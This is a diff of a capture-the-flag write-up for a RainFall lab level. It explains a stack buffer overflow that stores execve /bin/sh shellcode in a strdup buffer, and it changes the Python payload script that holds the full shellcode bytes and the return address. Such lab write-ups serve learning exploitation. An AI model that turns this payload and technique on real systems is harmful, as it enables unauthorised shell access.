@@ -95,11 +95,9 @@ puts("test"test
 strdup("test")                                                                = 0x0804a008
 +++ exited (status 8) +++
 ```
-We tried to do a buffer overflow with a ret2libc but it wasnt working because we didnt have the string "/bin/sh" in the binary. So we decided to use a shellcode exploit.
-Then we found a shellcode that we can use to exploit the binary. that has the string "/bin/sh" in it. and an execve syscall that we can use to spawn a shell. We used the space created by strdup to store our shell code, and the overflow to override the return pointer from function `p`.
+We attempted a buffer overflow using ret2libc, but it failed because the string "/bin/sh" was not present in the binary. Therefore, we opted for a shellcode exploit. We found a suitable shellcode that contains the string "/bin/sh" and an execve syscall to spawn a shell. We used the space created by strdup to store our shellcode and the overflow to override the return pointer from the function `p`.
 
-Many example was available here: https://shell-storm.org/shellcode/files/shellcode-811.html
-We simply filter by arch
+Many examples are available here: [Shell-Storm Shellcode Database](https://shell-storm.org/shellcode/files/shellcode-811.html) ([Shell-Storm Shellcode Index](https://shell-storm.org/shellcode/index.html)). We simply filtered by architecture.
 ```bash
 level3@RainFall:~$ uname -a
 Linux RainFall 3.2.0-90-generic-pae #128-Ubuntu SMP Fri Aug 14 22:16:51 UTC 2015 i686 athlon i386 GNU/Linux
@@ -142,9 +140,9 @@ We made python script to inject it:
 ```python
 import struct
 
-eip = struct.pack("I", 0x0804a008) // Return address from strdup
-payload = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + (80-28)*'A' + eip
-print payload+eip
+returnAddress = struct.pack("I", 0x0804a008) # Return address from strdup
+payload = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + (80-28)*'A' + returnAddress
+print payload
 ```
 
 Then inject the shellcode.
